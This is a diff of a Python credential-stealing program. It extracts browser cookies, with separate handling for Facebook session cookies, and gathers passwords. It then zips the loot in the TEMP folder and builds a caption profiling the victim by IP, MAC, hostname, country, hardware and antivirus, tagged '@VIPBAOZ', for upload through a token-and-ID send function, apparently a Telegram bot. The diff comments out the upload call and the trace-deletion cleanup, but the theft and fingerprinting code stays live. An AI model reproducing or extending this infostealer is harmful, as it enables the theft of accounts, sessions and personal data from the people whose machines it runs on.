@@ -370,7 +370,7 @@ def extract():
 
   
 
-    cookie_fb = {}
+    # cookie_fb = ''
 
     for row in datacookie:   
         c = sqlite3.connect(row['path'])
@@ -398,20 +398,23 @@ def extract():
             data1.append(cookie)
             cookies +=1
 
-        cookie_fb[row['name']] = cookie_fb_item
+        # cookie_fb[row['name']] = cookie_fb_item
        
         
         with open(os.path.join(path_data,'Cookie',row['name']+' '+row['profile']+'.txt'), "w",encoding='utf-8') as f:
             for line in data1:
                 f.write(line)
+
+
+        # text = ''
+        # for ck in cookie_fb:
+        #     text  += ck + '\n' + cookie_fb[ck] + '\n'
+
+        with open(os.path.join(path_data,'CookieFacebook',row['name']+' '+row['profile']+'.txt'), "w",encoding='utf-8') as f:
+                f.write(cookie_fb_item)
         
 
-    text = ''
-    for ck in cookie_fb:
-        text  += ck + '\n' + cookie_fb[ck] + '\n'
-
-    with open(os.path.join(path_data,'CookieFacebook','All.txt'), "w",encoding='utf-8') as f:
-            f.write(text)
+  
 
 
     datapassword = start2()
@@ -567,20 +570,18 @@ async def main(TOKEN, ID):
     z_ph = os.path.join(os.environ["TEMP"], name_f +'.zip');shutil.make_archive(z_ph[:-4], 'zip', path_data)
     caption = f"       ==== @VIPBAOZ ====\n⏰ Date => {datetime.now(vn_tz).strftime('%d/%m/%Y %H:%M')}\n💻System => {computer_os}\n👤 User => {username}\n🆔 PC => {hostname}\n🏴 Country => [{country}]\n🔍 IP => {ip}\n🔍 Mac => {mac}\n⚙ Ram => {ram}\n⚙ Cpu => {cpu}\n⚙ Gpu => {gpu}\n📝 Language => {language}\n🔓 Antivirus => {antivirus}\n ====[ User Data ]====\n📂 FileGrabber => {grabfiles}\n ====[ Browsers Data ]====\n🗝 Passwords => {passwd}\n🍪 Cookies => {cookies}"
     
-    await sendfile(TOKEN, ID, z_ph, caption)
+    # await sendfile(TOKEN, ID, z_ph, caption)
 
     shutil.rmtree(os.environ["TEMP"], name_f +'.zip');shutil.rmtree(os.environ["TEMP"], name_f)
 
-    try:
-       shutil.rmtree(path_data)
-       shutil.rmtree("C:\\Users\\Public\\Document")
+    # try:
+    #    shutil.rmtree(path_data)
 
-    except:
-        try:
-            os.system(f"rmdir {path_data}")
-            os.system(f"rmdir C:\\Users\\Public\\Document")
-        except:
-            pass
+    # except:
+    #     try:
+    #         os.system(f"rmdir {path_data}")
+    #     except:
+    #         pass
 
 
 
